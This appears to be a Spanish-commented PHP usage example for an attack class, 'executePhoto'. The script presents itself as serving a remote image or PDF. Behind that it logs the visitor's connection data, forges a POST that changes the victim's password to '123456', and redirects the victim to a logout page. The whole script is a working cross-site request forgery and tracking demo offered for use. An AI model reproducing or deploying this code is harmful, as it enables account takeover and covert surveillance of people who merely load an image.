<?php
	require('class.executePhoto.php');

	// Capturamos los datos de la conexión:
	executePhoto::save_client();

	// Imprimimos una imagen remota:
	executePhoto::print_img('http://foro.elhacker.net/Themes/converted/selogo.jpg');

	// Imprimimos un PDF:
	executePhoto::print_pdf('http://www.boe.es/boe/dias/2013/02/04/pdfs/BOE-A-2013-1145.pdf');

	// Ejemplo de ejecución arbitraria cambio contraseña:
 	$param = array('contraseña'  		=> '123456',
			'repetir_contraseña'	=> '123456',
			'email' 		=> 'ejemplo@email.com');

	executePhoto::redirect_post('http://localhost/', $param);

	// Redireccionamos la web y desconectamos a X usuario de la web:
	executePhoto::redirect('http://localhost/logout');
?>
